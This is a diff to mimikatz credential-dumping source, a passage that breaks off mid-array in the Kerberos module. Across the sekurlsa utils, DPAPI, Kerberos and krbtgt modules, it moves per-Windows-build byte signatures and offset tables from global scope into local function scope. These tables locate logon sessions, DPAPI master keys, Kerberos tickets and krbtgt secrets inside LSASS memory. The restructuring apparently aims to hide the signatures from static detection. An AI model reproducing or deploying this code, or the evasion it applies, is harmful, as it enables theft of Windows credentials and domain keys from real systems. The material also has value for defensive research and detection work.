@@ -481,6 +459,29 @@ NTSTATUS kuhl_m_sekurlsa_krbtgt(int argc, wchar_t * argv[])
 	{
 		if(kuhl_m_sekurlsa_kdcsvc_package.Module.isPresent)
 		{
+#if !defined(_M_ARM64) // No DC on ARM64, for now?
+#if defined(_M_X64)
+			BYTE PTRN_W2K3_SecData[] = { 0x48, 0x8d, 0x6e, 0x30, 0x48, 0x8d, 0x0d };
+			BYTE PTRN_W2K8_SecData[] = { 0x48, 0x8d, 0x94, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d };
+			BYTE PTRN_W2K12_SecData[] = { 0x4c, 0x8d, 0x85, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x15 };
+			BYTE PTRN_W2K12R2_SecData[] = { 0x0f, 0xb6, 0x4c, 0x24, 0x30, 0x85, 0xc0, 0x0f, 0x45, 0xcf, 0x8a, 0xc1 };
+			BYTE PTRN_W2K19_SecData[] = { 0x44, 0x8b, 0x45, 0x80, 0x85, 0xc0, 0x0f, 0x84 };
+			KULL_M_PATCH_GENERIC SecDataReferences[] = {
+				{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_W2K3_SecData),		PTRN_W2K3_SecData},		{0, NULL}, {  7, 37}},
+				{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_W2K8_SecData),		PTRN_W2K8_SecData},		{0, NULL}, { 11, 39}},
+				{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_W2K12_SecData),	PTRN_W2K12_SecData},	{0, NULL}, { 10, 39}},
+				{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_W2K12R2_SecData),	PTRN_W2K12R2_SecData},	{0, NULL}, {-12, 39}},
+				{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_W2K12R2_SecData),	PTRN_W2K12R2_SecData},	{0, NULL}, { -9, 39}},
+				{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_W2K19_SecData),	PTRN_W2K19_SecData},	{0, NULL}, { -9, 39}},
+			};
+#elif defined(_M_IX86)
+			BYTE PTRN_W2K3_SecData[] = { 0x53, 0x56, 0x8d, 0x45, 0x98, 0x50, 0xb9 };
+			BYTE PTRN_W2K8_SecData[] = { 0x8b, 0x45, 0x14, 0x83, 0xc0, 0x18, 0x50, 0xb9 };
+			KULL_M_PATCH_GENERIC SecDataReferences[] = {
+				{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_W2K3_SecData),		PTRN_W2K3_SecData},		{0, NULL}, {  7, 45}},
+				{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_W2K8_SecData),		PTRN_W2K8_SecData},		{0, NULL}, {  8, 47}},
+			};
+#endif
 			if(kuhl_m_sekurlsa_utils_search_generic(&cLsass, &kuhl_m_sekurlsa_kdcsvc_package.Module, SecDataReferences, ARRAYSIZE(SecDataReferences), &aLsass.address, NULL, NULL, &l))
 			{
 				aLsass.address = (PBYTE) aLsass.address + sizeof(PVOID) * l;
diff --git a/files/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c b/files/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c
index 536424e..ce7e8fb 100644
--- a/files/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c
+++ b/files/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c
@@ -5,52 +5,51 @@
 */
 #include "kuhl_m_sekurlsa_utils.h"
 
-#if defined(_M_ARM64)
-BYTE PTRN_WN1803_LogonSessionList[] = {0xf9, 0x03, 0x00, 0xaa, 0x58, 0xe7, 0x00, 0xa9};
-KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
-	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN1803_LogonSessionList),	PTRN_WN1803_LogonSessionList},	{0, NULL}, {-8, 4, -16, 4}},
-};
-#elif defined(_M_X64)
-BYTE PTRN_WIN5_LogonSessionList[]	= {0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8};
-BYTE PTRN_WN60_LogonSessionList[]	= {0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84};
-BYTE PTRN_WN61_LogonSessionList[]	= {0x33, 0xf6, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84};
-BYTE PTRN_WN63_LogonSessionList[]	= {0x8b, 0xde, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05};
-BYTE PTRN_WN6x_LogonSessionList[]	= {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74};
-BYTE PTRN_WN1703_LogonSessionList[]	= {0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74};
-BYTE PTRN_WN1803_LogonSessionList[] = {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74};
-KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
-	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList},	{0, NULL}, {-4,   0}},
-	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList},	{0, NULL}, {-4, -45}},
-	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WN60_LogonSessionList),	PTRN_WN60_LogonSessionList},	{0, NULL}, {21,  -4}},
-	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_LogonSessionList),	PTRN_WN61_LogonSessionList},	{0, NULL}, {19,  -4}},
-	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {16,  -4}},
-	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN63_LogonSessionList),	PTRN_WN63_LogonSessionList},	{0, NULL}, {36,  -6}},
-	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {16,  -4}},
-	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList},	{0, NULL}, {23,  -4}},
-	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN1803_LogonSessionList),	PTRN_WN1803_LogonSessionList},	{0, NULL}, {23,  -4}},
-	{KULL_M_WIN_BUILD_10_1903,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {23,  -4}},
-};
-#elif defined(_M_IX86)
-BYTE PTRN_WN51_LogonSessionList[]	= {0xff, 0x50, 0x10, 0x85, 0xc0, 0x0f, 0x84};
-BYTE PTRN_WNO8_LogonSessionList[]	= {0x89, 0x71, 0x04, 0x89, 0x30, 0x8d, 0x04, 0xbd};
-BYTE PTRN_WN80_LogonSessionList[]	= {0x8b, 0x45, 0xf8, 0x8b, 0x55, 0x08, 0x8b, 0xde, 0x89, 0x02, 0x89, 0x5d, 0xf0, 0x85, 0xc9, 0x74};
-BYTE PTRN_WN81_LogonSessionList[]	= {0x8b, 0x4d, 0xe4, 0x8b, 0x45, 0xf4, 0x89, 0x75, 0xe8, 0x89, 0x01, 0x85, 0xff, 0x74};
-BYTE PTRN_WN6x_LogonSessionList[]	= {0x8b, 0x4d, 0xe8, 0x8b, 0x45, 0xf4, 0x89, 0x75, 0xec, 0x89, 0x01, 0x85, 0xff, 0x74};
-KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
-	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WN51_LogonSessionList),	PTRN_WN51_LogonSessionList},	{0, NULL}, { 24,   0}},
-	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WNO8_LogonSessionList),	PTRN_WNO8_LogonSessionList},	{0, NULL}, {-11, -43}},
-	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_LogonSessionList),	PTRN_WNO8_LogonSessionList},	{0, NULL}, {-11, -42}},
-	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WN80_LogonSessionList),	PTRN_WN80_LogonSessionList},	{0, NULL}, { 18,  -4}},
-	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN81_LogonSessionList),	PTRN_WN81_LogonSessionList},	{0, NULL}, { 16,  -4}},
-	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, { 16,  -4}},
-};
-#endif
-
 PLIST_ENTRY LogonSessionList = NULL;
 PULONG LogonSessionListCount = NULL;
 
 BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib)
 {
+#if defined(_M_ARM64)
+	BYTE PTRN_WN1803_LogonSessionList[] = { 0xf9, 0x03, 0x00, 0xaa, 0x58, 0xe7, 0x00, 0xa9 };
+	KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
+		{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN1803_LogonSessionList),	PTRN_WN1803_LogonSessionList},	{0, NULL}, {-8, 4, -16, 4}},
+	};
+#elif defined(_M_X64)
+	BYTE PTRN_WIN5_LogonSessionList[] = { 0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8 };
+	BYTE PTRN_WN60_LogonSessionList[] = { 0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84 };
+	BYTE PTRN_WN61_LogonSessionList[] = { 0x33, 0xf6, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84 };
+	BYTE PTRN_WN63_LogonSessionList[] = { 0x8b, 0xde, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05 };
+	BYTE PTRN_WN6x_LogonSessionList[] = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
+	BYTE PTRN_WN1703_LogonSessionList[] = { 0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74 };
+	BYTE PTRN_WN1803_LogonSessionList[] = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74 };
+	KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
+		{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList},	{0, NULL}, {-4,   0}},
+		{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList},	{0, NULL}, {-4, -45}},
+		{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WN60_LogonSessionList),	PTRN_WN60_LogonSessionList},	{0, NULL}, {21,  -4}},
+		{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_LogonSessionList),	PTRN_WN61_LogonSessionList},	{0, NULL}, {19,  -4}},
+		{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {16,  -4}},
+		{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN63_LogonSessionList),	PTRN_WN63_LogonSessionList},	{0, NULL}, {36,  -6}},
+		{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {16,  -4}},
+		{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList},	{0, NULL}, {23,  -4}},
+		{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN1803_LogonSessionList),	PTRN_WN1803_LogonSessionList},	{0, NULL}, {23,  -4}},
+		{KULL_M_WIN_BUILD_10_1903,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {23,  -4}},
+	};
+#elif defined(_M_IX86)
+	BYTE PTRN_WN51_LogonSessionList[] = { 0xff, 0x50, 0x10, 0x85, 0xc0, 0x0f, 0x84 };
+	BYTE PTRN_WNO8_LogonSessionList[] = { 0x89, 0x71, 0x04, 0x89, 0x30, 0x8d, 0x04, 0xbd };
+	BYTE PTRN_WN80_LogonSessionList[] = { 0x8b, 0x45, 0xf8, 0x8b, 0x55, 0x08, 0x8b, 0xde, 0x89, 0x02, 0x89, 0x5d, 0xf0, 0x85, 0xc9, 0x74 };
+	BYTE PTRN_WN81_LogonSessionList[] = { 0x8b, 0x4d, 0xe4, 0x8b, 0x45, 0xf4, 0x89, 0x75, 0xe8, 0x89, 0x01, 0x85, 0xff, 0x74 };
+	BYTE PTRN_WN6x_LogonSessionList[] = { 0x8b, 0x4d, 0xe8, 0x8b, 0x45, 0xf4, 0x89, 0x75, 0xec, 0x89, 0x01, 0x85, 0xff, 0x74 };
+	KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
+		{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WN51_LogonSessionList),	PTRN_WN51_LogonSessionList},	{0, NULL}, { 24,   0}},
+		{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WNO8_LogonSessionList),	PTRN_WNO8_LogonSessionList},	{0, NULL}, {-11, -43}},
+		{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_LogonSessionList),	PTRN_WNO8_LogonSessionList},	{0, NULL}, {-11, -42}},
+		{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WN80_LogonSessionList),	PTRN_WN80_LogonSessionList},	{0, NULL}, { 18,  -4}},
+		{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN81_LogonSessionList),	PTRN_WN81_LogonSessionList},	{0, NULL}, { 16,  -4}},
+		{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, { 16,  -4}},
+	};
+#endif
 	PVOID *pLogonSessionListCount = (cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_2K3) ? NULL : ((PVOID *) &LogonSessionListCount);
 	return kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, LsaSrvReferences,  ARRAYSIZE(LsaSrvReferences), (PVOID *) &LogonSessionList, pLogonSessionListCount, NULL, NULL);
 }
diff --git a/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_dpapi.c b/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_dpapi.c
index 2f5f8ef..05cffdd 100644
--- a/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_dpapi.c
+++ b/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_dpapi.c
@@ -5,41 +5,6 @@
 */
 #include "kuhl_m_sekurlsa_dpapi.h"
 
-#if defined(_M_ARM64)
-BYTE PTRN_WI64_1803_MasterKeyCacheList[] = {0x09, 0xfd, 0xdf, 0xc8, 0x80, 0x42, 0x00, 0x91, 0x20, 0x01, 0x3f, 0xd6};
-KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
-	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WI64_1803_MasterKeyCacheList),	PTRN_WI64_1803_MasterKeyCacheList},	{0, NULL}, {16, 8}},
-};
-#elif defined(_M_X64)
-BYTE PTRN_W2K3_MasterKeyCacheList[]	= {0x4d, 0x3b, 0xee, 0x49, 0x8b, 0xfd, 0x0f, 0x85};
-BYTE PTRN_WI60_MasterKeyCacheList[]	= {0x49, 0x3b, 0xef, 0x48, 0x8b, 0xfd, 0x0f, 0x84};
-BYTE PTRN_WI61_MasterKeyCacheList[]	= {0x33, 0xc0, 0xeb, 0x20, 0x48, 0x8d, 0x05}; // InitializeKeyCache to avoid  version change
-BYTE PTRN_WI62_MasterKeyCacheList[]	= {0x4c, 0x89, 0x1f, 0x48, 0x89, 0x47, 0x08, 0x49, 0x39, 0x43, 0x08, 0x0f, 0x85};
-BYTE PTRN_WI63_MasterKeyCacheList[]	= {0x08, 0x48, 0x39, 0x48, 0x08, 0x0f, 0x85};
-BYTE PTRN_WI64_MasterKeyCacheList[]	= {0x48, 0x89, 0x4e, 0x08, 0x48, 0x39, 0x48, 0x08};
-BYTE PTRN_WI64_1607_MasterKeyCacheList[]	= {0x48, 0x89, 0x4f, 0x08, 0x48, 0x89, 0x78, 0x08};
-										 
-KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
-	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_W2K3_MasterKeyCacheList),	PTRN_W2K3_MasterKeyCacheList},	{0, NULL}, {-4}},
-	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_MasterKeyCacheList),	PTRN_WI60_MasterKeyCacheList},	{0, NULL}, {-4}},
-	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WI61_MasterKeyCacheList),	PTRN_WI61_MasterKeyCacheList},	{0, NULL}, { 7}},
-	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WI62_MasterKeyCacheList),	PTRN_WI62_MasterKeyCacheList},	{0, NULL}, {-4}},
-	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI63_MasterKeyCacheList),	PTRN_WI63_MasterKeyCacheList},	{0, NULL}, {-10}},
-	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WI64_MasterKeyCacheList),	PTRN_WI64_MasterKeyCacheList},	{0, NULL}, {-7}},
-	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WI64_1607_MasterKeyCacheList),	PTRN_WI64_1607_MasterKeyCacheList},	{0, NULL}, {11}},
-};
-#elif defined(_M_IX86)
-BYTE PTRN_WALL_MasterKeyCacheList[]	= {0x33, 0xc0, 0x40, 0xa3};
-BYTE PTRN_WI60_MasterKeyCacheList[]	= {0x8b, 0xf0, 0x81, 0xfe, 0xcc, 0x06, 0x00, 0x00, 0x0f, 0x84};
-KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
-	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_MasterKeyCacheList),	PTRN_WALL_MasterKeyCacheList},	{0, NULL}, {-4}},
-	{KULL_M_WIN_MIN_BUILD_8,	{sizeof(PTRN_WI60_MasterKeyCacheList),	PTRN_WI60_MasterKeyCacheList},	{0, NULL}, {-16}},// ?
-	{KULL_M_WIN_MIN_BUILD_BLUE,	{sizeof(PTRN_WALL_MasterKeyCacheList),	PTRN_WALL_MasterKeyCacheList},	{0, NULL}, {-4}},
-};
-#endif
-
-PKIWI_MASTERKEY_CACHE_ENTRY pMasterKeyCacheList = NULL;
-
 wchar_t other_lsas[] = { L'l', L's', L'a', L's', L'r', L'v', L'.', L'd', L'l', L'l', 0x0 };
 KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_dpapi_lsa_package = {L"dpapi", NULL, FALSE, other_lsas, {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
 KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_dpapi_svc_package = {L"dpapi", NULL, FALSE, L"dpapisrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
@@ -60,6 +25,40 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_dpapi(IN PKIWI_BASIC_SECURITY_LOGON_
 
 	if(pData->LogonType != Network)
 	{
+#if defined(_M_ARM64)
+		BYTE PTRN_WI64_1803_MasterKeyCacheList[] = { 0x09, 0xfd, 0xdf, 0xc8, 0x80, 0x42, 0x00, 0x91, 0x20, 0x01, 0x3f, 0xd6 };
+		KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
+			{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WI64_1803_MasterKeyCacheList),	PTRN_WI64_1803_MasterKeyCacheList},	{0, NULL}, {16, 8}},
+		};
+#elif defined(_M_X64)
+		BYTE PTRN_W2K3_MasterKeyCacheList[] = { 0x4d, 0x3b, 0xee, 0x49, 0x8b, 0xfd, 0x0f, 0x85 };
+		BYTE PTRN_WI60_MasterKeyCacheList[] = { 0x49, 0x3b, 0xef, 0x48, 0x8b, 0xfd, 0x0f, 0x84 };
+		BYTE PTRN_WI61_MasterKeyCacheList[] = { 0x33, 0xc0, 0xeb, 0x20, 0x48, 0x8d, 0x05 }; // InitializeKeyCache to avoid  version change
+		BYTE PTRN_WI62_MasterKeyCacheList[] = { 0x4c, 0x89, 0x1f, 0x48, 0x89, 0x47, 0x08, 0x49, 0x39, 0x43, 0x08, 0x0f, 0x85 };
+		BYTE PTRN_WI63_MasterKeyCacheList[] = { 0x08, 0x48, 0x39, 0x48, 0x08, 0x0f, 0x85 };
+		BYTE PTRN_WI64_MasterKeyCacheList[] = { 0x48, 0x89, 0x4e, 0x08, 0x48, 0x39, 0x48, 0x08 };
+		BYTE PTRN_WI64_1607_MasterKeyCacheList[] = { 0x48, 0x89, 0x4f, 0x08, 0x48, 0x89, 0x78, 0x08 };
+
+		KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
+			{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_W2K3_MasterKeyCacheList),	PTRN_W2K3_MasterKeyCacheList},	{0, NULL}, {-4}},
+			{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_MasterKeyCacheList),	PTRN_WI60_MasterKeyCacheList},	{0, NULL}, {-4}},
+			{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WI61_MasterKeyCacheList),	PTRN_WI61_MasterKeyCacheList},	{0, NULL}, { 7}},
+			{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WI62_MasterKeyCacheList),	PTRN_WI62_MasterKeyCacheList},	{0, NULL}, {-4}},
+			{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI63_MasterKeyCacheList),	PTRN_WI63_MasterKeyCacheList},	{0, NULL}, {-10}},
+			{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WI64_MasterKeyCacheList),	PTRN_WI64_MasterKeyCacheList},	{0, NULL}, {-7}},
+			{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WI64_1607_MasterKeyCacheList),	PTRN_WI64_1607_MasterKeyCacheList},	{0, NULL}, {11}},
+		};
+#elif defined(_M_IX86)
+		BYTE PTRN_WALL_MasterKeyCacheList[] = { 0x33, 0xc0, 0x40, 0xa3 };
+		BYTE PTRN_WI60_MasterKeyCacheList[] = { 0x8b, 0xf0, 0x81, 0xfe, 0xcc, 0x06, 0x00, 0x00, 0x0f, 0x84 };
+		KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
+			{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_MasterKeyCacheList),	PTRN_WALL_MasterKeyCacheList},	{0, NULL}, {-4}},
+			{KULL_M_WIN_MIN_BUILD_8,	{sizeof(PTRN_WI60_MasterKeyCacheList),	PTRN_WI60_MasterKeyCacheList},	{0, NULL}, {-16}},// ?
+			{KULL_M_WIN_MIN_BUILD_BLUE,	{sizeof(PTRN_WALL_MasterKeyCacheList),	PTRN_WALL_MasterKeyCacheList},	{0, NULL}, {-4}},
+		};
+#endif
+
+		PKIWI_MASTERKEY_CACHE_ENTRY pMasterKeyCacheList = NULL;
 		kuhl_m_sekurlsa_printinfos_logonData(pData);
 		if(pPackage->Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &pPackage->Module, MasterKeyCacheReferences, ARRAYSIZE(MasterKeyCacheReferences), (PVOID *) &pMasterKeyCacheList, NULL, NULL, NULL))
 		{
diff --git a/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c b/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c
index 4c205fb..6822359 100644
--- a/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c
+++ b/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c
@@ -4,42 +4,6 @@
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_sekurlsa_kerberos.h"
-#if defined(_M_ARM64)
-BYTE PTRN_WALL_KerbUnloadLogonSessionTable[] = {0x09, 0xfd, 0xdf, 0xc8, 0xe1, 0x03, 0x00, 0x91, 0x20, 0x01, 0x3f, 0xd6};
-KULL_M_PATCH_GENERIC KerberosReferences[] = {
-	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { -16, 4, 7}},
-};
-#elif defined(_M_X64)
-BYTE PTRN_WALL_KerbFreeLogonSessionList[]	= {0x48, 0x3b, 0xfe, 0x0f, 0x84};
-BYTE PTRN_WALL_KerbUnloadLogonSessionTable[]= {0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d};
-KULL_M_PATCH_GENERIC KerberosReferences[] = {
-	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_KerbFreeLogonSessionList),	PTRN_WALL_KerbFreeLogonSessionList},	{0, NULL}, {-4, 0}},
-	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_KerbFreeLogonSessionList),	PTRN_WALL_KerbFreeLogonSessionList},	{0, NULL}, {-4, 1}},
-	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 2}},
-	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 3}},
-	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 4}},
-	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 5}},
-	{KULL_M_WIN_BUILD_10_1511,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 6}},
-	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 7}},
-};
-#elif defined(_M_IX86)
-BYTE PTRN_WALL_KerbReferenceLogonSession[]	= {0x8b, 0x7d, 0x08, 0x8b, 0x17, 0x39, 0x50};
-BYTE PTRN_WNO8_KerbUnloadLogonSessionTable[]= {0x53, 0x8b, 0x18, 0x50, 0x56};
-BYTE PTRN_WIN8_KerbUnloadLogonSessionTable[]= {0x57, 0x8b, 0x38, 0x50, 0x68};
-BYTE PTRN_WI10_KerbUnloadLogonSessionTable[]= {0x56, 0x8b, 0x30, 0x50, 0x57};
-BYTE PTRN_WN1903_KerbUnloadLogonSessionTable[] = {0x56, 0x8b, 0x30, 0x50, 0x53};
-KULL_M_PATCH_GENERIC KerberosReferences[] = {
-	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_KerbReferenceLogonSession),	PTRN_WALL_KerbReferenceLogonSession},	{0, NULL}, {-8, 0}},
-	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_KerbReferenceLogonSession),	PTRN_WALL_KerbReferenceLogonSession},	{0, NULL}, {-8, 1}},
-	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_KerbUnloadLogonSessionTable),	PTRN_WNO8_KerbUnloadLogonSessionTable}, {0, NULL}, {-11,2}},
-	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WNO8_KerbUnloadLogonSessionTable),	PTRN_WNO8_KerbUnloadLogonSessionTable}, {0, NULL}, {-11,3}},
-	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_KerbUnloadLogonSessionTable),	PTRN_WIN8_KerbUnloadLogonSessionTable}, {0, NULL}, {-14,4}},
-	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI10_KerbUnloadLogonSessionTable),	PTRN_WI10_KerbUnloadLogonSessionTable}, {0, NULL}, {-15,4}},
-	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WI10_KerbUnloadLogonSessionTable),	PTRN_WI10_KerbUnloadLogonSessionTable}, {0, NULL}, {-15,5}},
-	{KULL_M_WIN_BUILD_10_1511,	{sizeof(PTRN_WI10_KerbUnloadLogonSessionTable),	PTRN_WI10_KerbUnloadLogonSessionTable}, {0, NULL}, {-15,7}},
